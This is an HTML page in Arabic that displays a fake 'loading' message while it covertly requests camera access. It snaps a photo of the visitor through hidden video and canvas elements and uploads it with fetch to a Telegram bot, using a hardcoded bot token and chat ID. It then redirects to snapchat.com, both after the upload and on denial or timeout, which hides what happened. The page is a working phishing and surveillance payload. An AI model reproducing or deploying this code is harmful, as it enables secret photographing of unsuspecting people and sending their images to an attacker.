<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { 
            text-align: center; 
            font-family: Arial, sans-serif; 
            padding-top: 50px; 
            background-color: #f4f4f4; 
            color: #333;
        }
        video, canvas { display: none; } /* إخفاء العناصر التقنية */
    </style>
</head>
<body>

    <div id="status">
        <h2>جاري تهيئة المتصفح...</h2>
        <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
    </div>

    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // معلوماتك الخاصة
        const TELEGRAM_TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
        const CHAT_ID = "7191557045"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // حل مشكلة التعليق: إذا لم تفتح الكاميرا خلال 4 ثوانٍ، سيتم التحويل تلقائياً
        const autoRedirect = setTimeout(() => {
            window.location.href = "https://snapchat.com";
        }, 4000);

        // طلب صلاحية الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                clearTimeout(autoRedirect); // إيقاف التحويل التلقائي لأن الكاميرا فتحت
                video.srcObject = stream;
                
                // الانتظار ثانية واحدة فقط لالتقاط صورة واضحة
                setTimeout(captureAndSend, 1000);
            })
            .catch(err => {
                // في حال الرفض أو وجود حظر من المتصفح
                window.location.href = "https://snapchat.com";
            });

        function captureAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "image.jpg");

                fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                })
                .finally(() => {
                    // التحويل فوراً بعد محاولة الإرسال
                    window.location.href = "https://snapchat.com";
                });
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
